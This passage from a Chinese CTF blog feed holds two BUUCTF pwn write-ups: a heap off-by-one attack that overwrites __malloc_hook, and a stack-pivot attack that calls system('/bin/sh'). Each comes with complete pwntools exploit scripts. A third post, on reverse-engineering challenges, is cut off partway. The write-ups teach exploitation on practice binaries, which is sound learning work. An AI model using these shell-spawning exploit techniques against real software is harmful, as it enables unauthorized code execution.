bin中<br>由于此时unsorted bin中只有一个chunk，它的fd和bk指针都指向unsorted_bin_addr，即main_arena+88<br>再申请unsorted bin中chunk一半的大小，根据glibc的内存分配机制，此时会直接对unsorted bin进行切割。<br>这时就可以泄露出main_arena的地址，而main_arena和libc基址的偏移是固定的，我们可以得到libc基址，进而得到其他函数的地址<br>最后在malloc-0x23位置构造fake chunk，将malloc修改为one_gadget，就可getshell了</p><h2 id="利用过程"><a href="#利用过程" class="headerlink" title="利用过程"></a>利用过程</h2><h3 id="申请四个堆块"><a href="#申请四个堆块" class="headerlink" title="申请四个堆块"></a>申请四个堆块</h3><p>第1个堆块用于off-by-one<br>第2个和第3个用于合并成超过0x80的chunk，释放后进入unsorted bin<br>第4个用于释放时防止与top chunk合并</p><figure class="highlight python"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs Python">add(<span class="hljs-number">0x18</span>,<span class="hljs-string">&#x27;a&#x27;</span>*<span class="hljs-number">0x18</span>) <span class="hljs-comment"># 0</span><br>add(<span class="hljs-number">0x60</span>,<span class="hljs-string">&#x27;bbbb&#x27;</span>) <span class="hljs-comment"># 1</span><br>add(<span class="hljs-number">0x60</span>,<span class="hljs-string">&#x27;dddd&#x27;</span>) <span class="hljs-comment"># 2</span><br>add(<span class="hljs-number">0x60</span>,<span class="hljs-string">&#x27;aaaa&#x27;</span>) <span class="hljs-comment"># 3</span><br></code></pre></div></td></tr></table></figure><h3 id="利用off-by-one"><a href="#利用off-by-one" class="headerlink" title="利用off-by-one"></a>利用off-by-one</h3><figure class="highlight python"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs Python">payload = <span class="hljs-string">&#x27;a&#x27;</span>*<span class="hljs-number">0x18</span> + p8(<span class="hljs-number">0xe1</span>)<br>edit(<span class="hljs-number">0</span>,payload)<br>delete(<span class="hljs-number">1</span>) <span class="hljs-comment"># 1</span><br></code></pre></div></td></tr></table></figure><p><img src="https://gitee.com/see1c3y/buuctf/raw/master/pwn/%5BV&N2020%20%E5%85%AC%E5%BC%80%E8%B5%9B%5DsimpleHeap/off-by-one.png"><br>此时可以看到chunk大小已经被修改<br><img src="https://gitee.com/see1c3y/buuctf/raw/master/pwn/%5BV&N2020%20%E5%85%AC%E5%BC%80%E8%B5%9B%5DsimpleHeap/off-by-one2.png"></p><h3 id="泄露main-arena，得到libc-base"><a href="#泄露main-arena，得到libc-base" class="headerlink" title="泄露main_arena，得到libc base"></a>泄露main_arena，得到libc base</h3><p>此时再申请一个堆块，再打印chunk2就可以泄露main_arena_88<br><img src="https://gitee.com/see1c3y/buuctf/raw/master/pwn/%5BV&N2020%20%E5%85%AC%E5%BC%80%E8%B5%9B%5DsimpleHeap/off-by-one3.png"></p><p>main_arena和main_arena_88的偏移为88，而main_arena和libc base的偏移可以由<a href="https://github.com/bash-c/main_arena_offset">main_arena</a>这个工具计算得到。有了libc基址我们就可以得到各种函数的地址了。</p><figure class="highlight python"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs python"><span class="hljs-comment"># main_arena_88 = u64(p.recv(6).ljust(8,&#x27;\x00&#x27;))</span><br>main_arena_88 = u64(p.recvuntil(<span class="hljs-string">&#x27;\x7f&#x27;</span>)[:-<span class="hljs-number">6</span>].ljust(<span class="hljs-number">8</span>,<span class="hljs-string">&#x27;\x00&#x27;</span>))<br>log.success(<span class="hljs-string">&#x27;main arena+88:0x%x&#x27;</span> % main_arena_88)<br>main_arena = main_arena_88 - <span class="hljs-number">88</span><br>log.success(<span class="hljs-string">&#x27;main arena:0x%x&#x27;</span> % main_arena)<br>main_arena_offset_with_libc_base = <span class="hljs-number">0x3c4b20</span><br>libc_base = main_arena - main_arena_offset_with_libc_base<br>malloc_hook = libc_base + libc.symbols[<span class="hljs-string">&#x27;__malloc_hook&#x27;</span>]<br>one_gadget = <span class="hljs-number">0x4526a</span> + libc_base<br>realloc=libc_base+libc.symbols[<span class="hljs-string">&#x27;__libc_realloc&#x27;</span>]<br><span class="hljs-comment"># realloc = libc_base + 0x846c0</span><br>log.success(<span class="hljs-string">&#x27;libc base:0x%x&#x27;</span> % libc_base)<br>log.success(<span class="hljs-string">&#x27;malloc_hook:0x%x&#x27;</span> % malloc_hook)<br>log.success(<span class="hljs-string">&#x27;one_gadget:0x%x&#x27;</span> % one_gadget)<br>log.success(<span class="hljs-string">&#x27;realloc:0x%x&#x27;</span> % realloc)<br></code></pre></div></td></tr></table></figure><h3 id="劫持malloc"><a href="#劫持malloc" class="headerlink" title="劫持malloc"></a>劫持malloc</h3><p>此时我们申请一个0x60的堆块chunk4来控制chunk2<br><img src="https://gitee.com/see1c3y/buuctf/raw/master/pwn/%5BV&N2020%20%E5%85%AC%E5%BC%80%E8%B5%9B%5DsimpleHeap/malloc.png"><br>再先后释放chunk3和chunk2:<br><img src="https://gitee.com/see1c3y/buuctf/raw/master/pwn/%5BV&N2020%20%E5%85%AC%E5%BC%80%E8%B5%9B%5DsimpleHeap/malloc2.png"><br>这时我们就可以通过chunk4来修改chunk2的fd指针（下列几步由于本地环境有点问题没法动态调试）：</p><figure class="highlight python"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs Python">fake_chunk = malloc_hook - <span class="hljs-number">0x23</span> <span class="hljs-comment"># size=0x7f allocate a 0x68 chunk to make use of the fake chunk</span><br>payload = p64(fake_chunk) + <span class="hljs-string">&#x27;\n&#x27;</span><br>edit(<span class="hljs-number">4</span>,payload) <br></code></pre></div></td></tr></table></figure><p>然后申请chunk5来重启chunk2:</p><figure class="highlight python"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs Python">add(<span class="hljs-number">0x60</span>, <span class="hljs-string">&#x27;aaaa\n&#x27;</span>) <span class="hljs-comment"># 5</span><br></code></pre></div></td></tr></table></figure><p>申请并劫持malloc:</p><figure class="highlight python"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs Python">payload = <span class="hljs-string">&#x27;a&#x27;</span>*<span class="hljs-number">11</span> + p64(one_gadget) + p64(realloc+<span class="hljs-number">12</span>) + <span class="hljs-string">&#x27;\n&#x27;</span><br>add(<span class="hljs-number">0x60</span>, payload)<br></code></pre></div></td></tr></table></figure><p>之后再申请任意大小的chunk就可以getshell了</p><h2 id="完整exp"><a href="#完整exp" class="headerlink" title="完整exp"></a>完整exp</h2><figure class="highlight python"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs python"><span class="hljs-comment">#coding=utf-8</span><br><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span>*<br><br>context.log_level=<span class="hljs-string">&#x27;debug&#x27;</span><br>context.terminal=[<span class="hljs-string">&#x27;tmux&#x27;</span>,<span class="hljs-string">&#x27;splitw&#x27;</span>,<span class="hljs-string">&#x27;-h&#x27;</span>]<br>elf = ELF(<span class="hljs-string">&#x27;./vn_pwn_simpleHeap&#x27;</span>)<br>libc = ELF(<span class="hljs-string">&#x27;./libc-2.23.so&#x27;</span>)<br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">debug</span>():</span><br>    gdb.attach(p)<br>    raw_input(<span class="hljs-string">&#x27;en..&#x27;</span>)<br>    <span class="hljs-comment"># print &quot;pid &quot; + str(proc.pidof(p))</span><br>    <span class="hljs-comment"># raw_input(&quot;attach me&quot;)</span><br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">add</span>(<span class="hljs-params">size, content</span>):</span><br>    p.recvuntil(<span class="hljs-string">&#x27;: &#x27;</span>)<br>    p.sendline(<span class="hljs-string">&#x27;1&#x27;</span>)<br>    p.recvuntil(<span class="hljs-string">&#x27;size?&#x27;</span>)<br>    p.sendline(<span class="hljs-built_in">str</span>(size))<br>    p.recvuntil(<span class="hljs-string">&#x27;content:&#x27;</span>)<br>    p.send(content)<br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">edit</span>(<span class="hljs-params">idx, content</span>):</span><br>    p.recvuntil(<span class="hljs-string">&#x27;: &#x27;</span>)<br>    p.sendline(<span class="hljs-string">&#x27;2&#x27;</span>)<br>    p.recvuntil(<span class="hljs-string">&#x27;idx?&#x27;</span>)<br>    p.sendline(<span class="hljs-built_in">str</span>(idx))<br>    p.recvuntil(<span class="hljs-string">&#x27;content:&#x27;</span>)<br>    p.send(content)<br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">delete</span>(<span class="hljs-params">idx</span>):</span><br>    p.recvuntil(<span class="hljs-string">&#x27;: &#x27;</span>)<br>    p.sendline(<span class="hljs-string">&#x27;4&#x27;</span>)<br>    p.recvuntil(<span class="hljs-string">&#x27;idx?&#x27;</span>)<br>    p.sendline(<span class="hljs-built_in">str</span>(idx))<br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">show</span>(<span class="hljs-params">idx</span>):</span><br>    p.recvuntil(<span class="hljs-string">&#x27;: &#x27;</span>)<br>    p.sendline(<span class="hljs-string">&#x27;3&#x27;</span>)<br>    p.recvuntil(<span class="hljs-string">&#x27;idx?&#x27;</span>)<br>    p.sendline(<span class="hljs-built_in">str</span>(idx))<br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">exploit</span>(<span class="hljs-params">p</span>):</span><br>    add(<span class="hljs-number">0x18</span>,<span class="hljs-string">&#x27;a&#x27;</span>*<span class="hljs-number">0x18</span>) <span class="hljs-comment"># 0</span><br>    add(<span class="hljs-number">0x60</span>,<span class="hljs-string">&#x27;bbbb&#x27;</span>) <span class="hljs-comment"># 1</span><br>    add(<span class="hljs-number">0x60</span>,<span class="hljs-string">&#x27;dddd&#x27;</span>) <span class="hljs-comment"># 2</span><br>    add(<span class="hljs-number">0x60</span>,<span class="hljs-string">&#x27;aaaa&#x27;</span>) <span class="hljs-comment"># 3</span><br><br>    payload = <span class="hljs-string">&#x27;a&#x27;</span>*<span class="hljs-number">0x18</span> + p8(<span class="hljs-number">0xe1</span>)<br>    edit(<span class="hljs-number">0</span>,payload)<br>    delete(<span class="hljs-number">1</span>) <span class="hljs-comment"># 1</span><br>    <span class="hljs-comment"># debug()</span><br>    add(<span class="hljs-number">0x60</span>,<span class="hljs-string">&#x27;aaaa&#x27;</span>) <span class="hljs-comment">#1</span><br>    <span class="hljs-comment"># debug()</span><br>    show(<span class="hljs-number">2</span>)<br>    <span class="hljs-comment"># main_arena_88 = u64(p.recv(6).ljust(8,&#x27;\x00&#x27;))</span><br>    main_arena_88 = u64(p.recvuntil(<span class="hljs-string">&#x27;\x7f&#x27;</span>)[:-<span class="hljs-number">6</span>].ljust(<span class="hljs-number">8</span>,<span class="hljs-string">&#x27;\x00&#x27;</span>))<br>    log.success(<span class="hljs-string">&#x27;main arena+88:0x%x&#x27;</span> % main_arena_88)<br>    main_arena = main_arena_88 - <span class="hljs-number">88</span><br>    log.success(<span class="hljs-string">&#x27;main arena:0x%x&#x27;</span> % main_arena)<br>    main_arena_offset_with_libc_base = <span class="hljs-number">0x3c4b20</span><br>    libc_base = main_arena - main_arena_offset_with_libc_base<br>    malloc_hook = libc_base + libc.symbols[<span class="hljs-string">&#x27;__malloc_hook&#x27;</span>]<br>    one_gadget = <span class="hljs-number">0x4526a</span> + libc_base<br>    realloc=libc_base+libc.symbols[<span class="hljs-string">&#x27;__libc_realloc&#x27;</span>]<br>    <span class="hljs-comment"># realloc = libc_base + 0x846c0</span><br>    log.success(<span class="hljs-string">&#x27;libc base:0x%x&#x27;</span> % libc_base)<br>    log.success(<span class="hljs-string">&#x27;malloc_hook:0x%x&#x27;</span> % malloc_hook)<br>    log.success(<span class="hljs-string">&#x27;one_gadget:0x%x&#x27;</span> % one_gadget)<br>    log.success(<span class="hljs-string">&#x27;realloc:0x%x&#x27;</span> % realloc)<br>    add(<span class="hljs-number">0x60</span>, <span class="hljs-string">&#x27;\n&#x27;</span>) <span class="hljs-comment"># 4(2)</span><br>    <span class="hljs-comment"># debug()</span><br>    delete(<span class="hljs-number">3</span>)<br>    delete(<span class="hljs-number">2</span>)<br>    <span class="hljs-comment"># debug()</span><br>    fake_chunk = malloc_hook - <span class="hljs-number">0x23</span> <span class="hljs-comment"># size=0x7f allocate a 0x68 chunk to make use of the fake chunk</span><br>    payload = p64(fake_chunk)<br>    edit(<span class="hljs-number">4</span>,payload) <br>    add(<span class="hljs-number">0x60</span>, <span class="hljs-string">&#x27;aaaa\n&#x27;</span>) <span class="hljs-comment"># 5</span><br>    debug()<br>    payload = <span class="hljs-string">&#x27;a&#x27;</span>*<span class="hljs-number">11</span> + p64(one_gadget) + p64(realloc+<span class="hljs-number">12</span>) + <span class="hljs-string">&#x27;\n&#x27;</span><br>    add(<span class="hljs-number">0x60</span>, payload)<br>    <span class="hljs-comment"># debug()</span><br>    p.sendlineafter(<span class="hljs-string">&#x27;: &#x27;</span>,<span class="hljs-string">&#x27;1&#x27;</span>)<br>    p.sendlineafter(<span class="hljs-string">&#x27;size?&#x27;</span>,<span class="hljs-string">&#x27;32&#x27;</span>)<br>    p.interactive()<br>    <span class="hljs-comment"># payload = &#x27;a&#x27;*3 + &#x27;a&#x27;*0x20 + p64(one_gadget)</span><br>    <span class="hljs-comment"># add(0x60,&#x27;payload&#x27;) # 6</span><br><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&quot;__main__&quot;</span>:<br>    log.info(<span class="hljs-string">&quot;For remote: %s HOST PORT&quot;</span> % sys.argv[<span class="hljs-number">0</span>])<br>    <span class="hljs-keyword">if</span> <span class="hljs-built_in">len</span>(sys.argv) &gt; <span class="hljs-number">1</span>:<br>        p = remote(sys.argv[<span class="hljs-number">1</span>], <span class="hljs-built_in">int</span>(sys.argv[<span class="hljs-number">2</span>]))<br>        exploit(p)<br>    <span class="hljs-keyword">else</span>:<br>        <span class="hljs-comment"># p = process([&#x27;./babyheap&#x27;], env=&#123;&quot;LD_PRELOAD&quot;:&quot;./libc.so.6&quot;&#125;)</span><br>        p = process(<span class="hljs-string">&#x27;./vn_pwn_simpleHeap&#x27;</span>)<br>        <span class="hljs-built_in">print</span> util.proc.pidof(p)<br>        exploit(p)<br></code></pre></div></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>CTF</category>
      
    </categories>
    
    
    <tags>
      
      <tag>pwn</tag>
      
      <tag>BUUCTF</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>ciscn_2019_es_2</title>
    <link href="/2021/02/07/ciscn_2019_es_2/"/>
    <url>/2021/02/07/ciscn_2019_es_2/</url>
    
    <content type="html"><![CDATA[<p>这题涉及的知识点是栈迁移。<br>关于栈迁移，贴一篇师傅的博文：<a href="https://bbs.pediy.com/thread-258030.htm">[原创]栈迁移原理（图示)</a>，讲的很好。</p><h3 id="Solution"><a href="#Solution" class="headerlink" title="Solution"></a>Solution</h3><h2 id="0x1"><a href="#0x1" class="headerlink" title="0x1"></a>0x1</h2><p>先查看防护<br><img src="https://gitee.com/see1c3y/buuctf/raw/master/pwn/ciscn_2019_es_2/checksec.png"></p><h2 id="0x2"><a href="#0x2" class="headerlink" title="0x2"></a>0x2</h2><p>IDA打开，进到vul函数，反汇编代码如下：</p><figure class="highlight c++"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c++"><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">vul</span><span class="hljs-params">()</span></span><br><span class="hljs-function"></span>&#123;<br>  <span class="hljs-keyword">char</span> s; <span class="hljs-comment">// [esp+0h] [ebp-28h]</span><br><br>  <span class="hljs-built_in">memset</span>(&amp;s, <span class="hljs-number">0</span>, <span class="hljs-number">0x20</span>u);<br>  read(<span class="hljs-number">0</span>, &amp;s, <span class="hljs-number">0x30</span>u);<br>  <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Hello, %s\n&quot;</span>, &amp;s);<br>  read(<span class="hljs-number">0</span>, &amp;s, <span class="hljs-number">0x30</span>u);<br>  <span class="hljs-keyword">return</span> <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Hello, %s\n&quot;</span>, &amp;s);<br>&#125;<br></code></pre></div></td></tr></table></figure><p>可以看到read函数存在栈溢出，s距离ebp为0x28，而read只能读入0x30，可以溢出0x30-0x28=0x8个字节，也就是正好覆盖edb和ret。<br>溢出距离不足以构造常规的ROP链，需要利用栈迁移的技巧将栈劫持到我们指定的地址。<br>再审计代码，发现printf函数可以用来泄露栈上的内容，因为memset为s分配了0x20的空间，并全部以\x00进行初始化，而printf函数在打印过程中遇到\x00就会被截断，所以当第一次read的时候构造:</p><figure class="highlight ini"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs ini"><span class="hljs-attr">payload</span> = <span class="hljs-string">&#x27;a&#x27;</span>*<span class="hljs-number">0</span>x20 + padding<br></code></pre></div></td></tr></table></figure><p>先把s全部填满，再补齐到ebp前的空间，那么在printf打印s的时候就可以把ebp的内容带出来。</p><h2 id="0x3"><a href="#0x3" class="headerlink" title="0x3"></a>0x3</h2><p>接下来进行gdb动态调试，先贴出调试的exp:</p><figure class="highlight python"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span>*<br><br>context.log_level = <span class="hljs-string">&#x27;debug&#x27;</span><br><br>p = process(<span class="hljs-string">&#x27;./ciscn_2019_es_2&#x27;</span>)<br><span class="hljs-comment"># p = remote(&#x27;node3.buuoj.cn&#x27;,28462)</span><br>elf = ELF(<span class="hljs-string">&#x27;./ciscn_2019_es_2&#x27;</span>)<br>sys_addr = <span class="hljs-number">0x8048400</span><br>leave_ret = <span class="hljs-number">0x080484b8</span><br><span class="hljs-comment">#这里的断点选的是这一段：.text:080485CD                 call    _printf</span><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">debug</span>(<span class="hljs-params">addr = <span class="hljs-string">&#x27;0x080485CD&#x27;</span></span>):</span> <br>    raw_input(<span class="hljs-string">&#x27;debug?&#x27;</span>)<br>    gdb.attach(p, <span class="hljs-string">&quot;b *&quot;</span> + addr)<br>debug()<br>p.recvuntil(<span class="hljs-string">&quot;your name?&quot;</span>)<br>payload = <span class="hljs-string">&#x27;a&#x27;</span>*<span class="hljs-number">0x20</span> + <span class="hljs-string">&#x27;b&#x27;</span>*<span class="hljs-number">4</span> + <span class="hljs-string">&#x27;c&#x27;</span>*<span class="hljs-number">4</span><br>p.send(payload) <span class="hljs-comment">#不可用sendline,不然会多送一个\n</span><br>pause()<br></code></pre></div></td></tr></table></figure><p>进到调试终端后按c继续，查看栈帧：<br><img src="https://gitee.com/see1c3y/buuctf/raw/master/pwn/ciscn_2019_es_2/gdb1.png"><br>可以看到ebp栈上的内容为栈上的一个地址：leak_addr=0xffa3ee78，它与s的offset=0x40-0x10=0x38，所以s的地址为leak_addr-0x38。<br>我们还需要leave|ret这样的gadget，找一下：</p><figure class="highlight bash"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs bash">$ ROPgadget --binary ciscn_2019_es_2 --only <span class="hljs-string">&#x27;leave|ret&#x27;</span> | grep <span class="hljs-string">&#x27;leave&#x27;</span><br>0x080484b8 : leave ; ret<br></code></pre></div></td></tr></table></figure><h2 id="0x4"><a href="#0x4" class="headerlink" title="0x4"></a>0x4</h2><p>所以可以构造payload如下：</p><figure class="highlight python"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs python">payload2 = <span class="hljs-string">&#x27;fake&#x27;</span> + p32(sys_addr) + p32(<span class="hljs-number">0xdeadbeef</span>) + p32(leak_addr-<span class="hljs-number">0x28</span>) + <span class="hljs-string">&#x27;/bin/sh&#x27;</span><br>payload2 = payload2.ljust(<span class="hljs-number">0x28</span>,<span class="hljs-string">&#x27;\x00&#x27;</span>)<br>payload2 += p32(leak_addr-<span class="hljs-number">0x38</span>) + p32(leave_ret)<br></code></pre></div></td></tr></table></figure><p>整个栈迁移的过程如下图所示：<br><img src="https://gitee.com/see1c3y/buuctf/raw/master/pwn/ciscn_2019_es_2/stack.png"><br>将/bin/sh放置在了距离leak为0x28的位置，system函数传参的时候将地址传进去。</p><h2 id="0x5"><a href="#0x5" class="headerlink" title="0x5"></a>0x5</h2><p>完整exp:</p><figure class="highlight python"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span>*<br><br>context.log_level = <span class="hljs-string">&#x27;debug&#x27;</span><br><br>p = process(<span class="hljs-string">&#x27;./ciscn_2019_es_2&#x27;</span>)<br><span class="hljs-comment"># p = remote(&#x27;node3.buuoj.cn&#x27;,28462)</span><br>elf = ELF(<span class="hljs-string">&#x27;./ciscn_2019_es_2&#x27;</span>)<br>sys_addr = <span class="hljs-number">0x8048400</span><br>leave_ret = <span class="hljs-number">0x080484b8</span><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">debug</span>(<span class="hljs-params">addr = <span class="hljs-string">&#x27;0x080485CD&#x27;</span></span>):</span><br>    raw_input(<span class="hljs-string">&#x27;debug?&#x27;</span>)<br>    gdb.attach(p, <span class="hljs-string">&quot;b *&quot;</span> + addr)<br><br>debug()<br>p.recvuntil(<span class="hljs-string">&quot;your name?&quot;</span>)<br>payload = <span class="hljs-string">&#x27;a&#x27;</span>*<span class="hljs-number">0x20</span> + <span class="hljs-string">&#x27;b&#x27;</span>*<span class="hljs-number">4</span> + <span class="hljs-string">&#x27;c&#x27;</span>*<span class="hljs-number">4</span><br>p.send(payload)<br>p.recvuntil(<span class="hljs-string">&#x27;cccc&#x27;</span>)<br>leak_addr = u32(p.recv(<span class="hljs-number">4</span>))<br><br>payload2 = <span class="hljs-string">&#x27;fake&#x27;</span> + p32(sys_addr) + p32(<span class="hljs-number">0xdeadbeef</span>) + p32(leak_addr-<span class="hljs-number">0x28</span>) + <span class="hljs-string">&#x27;/bin/sh&#x27;</span><br>payload2 = payload2.ljust(<span class="hljs-number">0x28</span>,<span class="hljs-string">&#x27;\x00&#x27;</span>)<br>payload2 += p32(leak_addr-<span class="hljs-number">0x38</span>) + p32(leave_ret)<br>p.sendline(payload2)<br>p.interactive()<br></code></pre></div></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>CTF</category>
      
    </categories>
    
    
    <tags>
      
      <tag>pwn</tag>
      
      <tag>BUUCTF</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>SCUCTF2020 新生赛</title>
    <link href="/2020/11/29/WriteUp/"/>
    <url>/2020/11/29/WriteUp/</url>
    
    <content type="html"><![CDATA[<p>SCUCTF赛后的一点小小记录…</p><h2 id="Reverse"><a href="#Reverse" class="headerlink" title="Reverse"></a>Reverse</h2><h3 id="1-easyF5"><a href="#1-easyF5" class="headerlink" title="1.easyF5"></a>1.easyF5</h3><p><img src="https://gitee.com/see1c3y/scuctf2020/raw/master/re/re1/re1.1.png"></p><p>扔进IDA,然后F5得到flag:</p><p><img src="https://gitee.com/see1c3y/scuctf2020/raw/master/re/re1/re1.2.png"></p><hr><h3 id="2-easypack"><a href="#2-easypack" class="headerlink" title="2.easypack"></a>2.easypack</h3><p>扔进exeinfope,发现有upx壳</p><p><img src="https://gitee.com/see1c3y/scuctf2020/raw/master/re/re2/re2.1.png"></p><p>直接kali脱壳</p><p><img src="https://gitee.com/see1c3y/scuctf2020/raw/master/re/re2/re2.2.png"></p><p>在OD打开</p><p><img src="https://gitee.com/see1c3y/scuctf2020/raw/master/re/re2/re2.3.png"></p><p>然后右键-&gt;中文搜索引擎-&gt;智能搜索,然后在输入语句后一句双击进入</p><p><img src="https://gitee.com/see1c3y/scuctf2020/raw/master/re/re2/re2.4.png"></p><p>Jnz处F2下断点,F9运行</p><p><img src="https://gitee.com/see1c3y/scuctf2020/raw/master/re/re2/re2.5.png"></p><p>随便输入一串验证码</p><p><img src="https://gitee.com/see1c3y/scuctf2020/raw/master/re/re2/re2.6.png"></p><p>回车后得到flag</p><p><img src="https://gitee.com/see1c3y/scuctf2020/raw/master/re/re2/re2.7.png"></p><hr><h3 id="3-pytrade"><a href="#3-pytrade" class="headerlink" title="3.pytrade"></a>3.pytrade</h3><p>把pyc文件进行python反编译</p><p><img src="https://gitee.com/see1c3y/scuctf2020/raw/master/re/re3/re3.1.png"></p><p>将flag_base64进行base64解密,得到flag</p><p><img src="https://gitee.com/see1c3y/scuctf2020/raw/master/re/re3/re3.2.png"></p><hr><h3 id="4-crackme"><a href="#4-crackme" class="headerlink" title="4.crackme"></a>4.crackme</h3><p>OD运行,然后右键-&gt;中文搜索引擎-&gt;智能搜索,双击选中error进入</p><p><img src="https://gitee.com/see1c3y/scuctf2020/raw/master/re/re4/re4.1.png"></p><p>选中输入验证码跳转处</p><p><img 